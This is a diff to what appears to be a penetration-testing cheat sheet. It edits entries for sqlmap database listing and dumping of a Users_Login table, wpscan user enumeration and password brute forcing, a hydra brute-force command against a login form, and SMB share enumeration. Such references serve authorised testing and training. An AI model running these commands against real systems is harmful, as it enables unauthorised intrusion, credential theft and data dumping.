@@ -34,10 +34,14 @@
 
 ---
 
-  **List DBs:** `sqlmap -u <url> --cookie "<value>" --dbs`
-  **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`
+  **sqlmap:**
+--dbs
+--tables
+--dump
+--cookie
+-r request.txt
 
-
+---
 *   **Scan URL:** `wpscan -url <domain or ip>`
 *   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt -e u`
 
@@ -67,7 +71,6 @@
 
 ---
 
-### SMB & Remote Login
 *   **HTTP POST Form:**  
     `hydra -l admin -P pass.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid"`
 *   **Check Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
